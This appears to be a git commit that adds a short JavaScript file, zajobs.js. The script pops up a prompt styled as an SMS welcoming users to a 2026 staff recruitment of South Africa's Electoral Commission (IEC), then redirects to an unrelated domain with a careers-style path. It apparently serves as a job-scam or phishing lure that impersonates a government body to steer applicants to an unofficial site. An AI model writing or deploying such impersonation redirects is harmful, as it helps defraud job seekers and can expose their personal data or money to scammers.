e8196d7007751c77939a40ae562257ed4b1bf63e
usorondo81 <bassos-07.utility@icloud.com>
2026-06-20 05:28:56 +0100

    Create zajobs.js

---
+++ zajobs.js
@@ -0,0 +1,8 @@
+var password = 'APPLY'
+password = prompt(
+  'SMS: Welcome to The Electoral Commission of South Africa (IEC) Staff Recruitment 2026. Please click OK to Proceed.',
+  'APPLY'
+);
+if (password != 'APPLY') {
+  location.href = 'https://www.ufofobitid.site/apply-za-org-careers';
+}
